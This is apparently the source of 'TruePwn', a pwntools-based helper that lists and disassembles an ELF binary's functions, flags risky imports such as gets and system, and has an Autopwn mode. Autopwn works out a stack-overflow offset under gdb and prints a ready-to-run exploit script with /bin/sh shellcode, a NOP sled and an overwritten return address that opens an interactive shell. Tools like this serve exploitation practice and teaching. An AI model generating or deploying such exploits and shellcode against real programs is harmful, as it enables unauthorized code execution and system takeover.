from pwn import *
from rich.layout import Layout, Panel
from rich.syntax import Syntax
from rich.console import Console
context.log_level='error'

'''
@@  Automatic inputs scan [soon] 
'''
def Count_input():
	for i in range(100):
		try:
			p.recv()
			p.sendline(b'TruePwn!')
		except:
			break
	return i - 1

'''
@@ get functions name
'''
def Function_names(file):
	return f'\n'.join(f'\t[red]{hex(file.symbols[i])}[/]\t\t\t{i}' for i in file.functions)

'''
@@ disassemble main()
'''
def disassemble_main(file):
	Size_b = file.functions['main'].size
	addr = file.functions['main'].address
	there_is_more = '\n    [b]more ...[/]' if Size_b > 110 else ''
	return file.disasm(addr , Size_b if Size_b < 150 else 110) + there_is_more


def Vuln_detect(elf):
	format_str = ["fprintf", "fscanf", "printf", "scanf", "sprintf", "sscanf"]
	commandEx = ["system", "execl", "execle", "execlp", "execv", "execve", "execvp", "popen"]

	BufMemory = ["calloc", "malloc", "realloc", "fscanf", "gets", "scanf", "sprintf", "sscanf", "strcat", 
				 "strcpy","strncat","strncmp", "memchr", "memcmp", "memcpy", "memmove", "memset", "fwscan"]

	Magic = format_str + commandEx + BufMemory
	detect = []
	for i in Magic:
		try:
			elf.symbols[i]
			detect.append(i)
		except:
			pass
	return f'[ [red]{"[white], [/]".join(detect)}[/] ]'




def Autopwn(filename):
	'''
	@@ Autopwn Rule : 
		1 - Only one input [for now]
		2 - BUF[X]   :  900 > X          // You can change it, by change pattern size create .
		[ all this will be fixed & change it to better way ><" ]
	'''

	## // this will create 900 pattern length 
	open('TruePwn_pattern','wb+').write(cyclic(900))
	read_offset = subprocess.run(f'gdb --nx {filename} -ex "r < TruePwn_pattern" -ex "x/s \\$rsp" --batch -q;rm TruePwn_pattern',shell=True, capture_output=True).stdout.decode().strip().splitlines()[-1].split('\t')[1][1:8]
	open('removeme','wb+').write(b"\x90"*900 + b"w00tw00t")
	read_RA = subprocess.run(f'gdb --nx {filename} -ex "r < removeme " -ex "x/-68xw \\$rsp" --batch -q;rm removeme',shell=True, capture_output=True).stdout.decode().strip().splitlines()[2].split('\t')[0][:-1]
	offset = cyclic_find(read_offset)
	if read_offset.isalpha():
		return f'''\n
# [@] TruePwn v1.0
# [@] AutoPwn Mode 
# [@] Github : https://github.com/0xNullByte

from pwn import *

# pattern = cyclic(900) : By default [*900]
offset = {offset}

# 24 byte /bin/sh
shellcode = b"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7"
shellcode += b"\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05"

payload =  b"\\x90" * {int(offset / 2)}  # int(offset / 2)
payload += shellcode 
payload += b"\\x90" * (offset - len(payload)) + p64({read_RA}) # read_RA

p = process('{filename}')
p.recv()
p.sendline(payload)
p.interactive()

# file saved : Texploit.py\n\n\n
'''
	else:
		return "\n"*10 + "\t\t\t[red][b][yellow][!][/] AutoPwn didn't get the right result! [b][/]"

def disas(elf, function_name):
	console = Console()
	try:
		size = elf.functions[function_name].size
		addr = elf.functions[function_name].address
		# check if args[2] == int : address |OR| args[2] str == function name 
		disasm = elf.disasm(addr, size) if type(function_name) == str else elf.disasm(address, function_name)
	except:
		disasm = "Make sure it`s a correct [Function or Address]"
	# Why .js ? to get beautiful Syntax highlight :) .
	open(f'./Disassm_removeme.js','w+').write(disasm)
	subprocess.run('clear')
	console.print(Panel(Syntax.from_path('./Disassm_removeme.js'), title=f"[blue][b]disassemble { {function_name} }.[/][/]" ,subtitle="[b][blue] Press enter to back into menu page[/][/]"))
	input()
	subprocess.run(['rm', 'Disassm_removeme.js'])




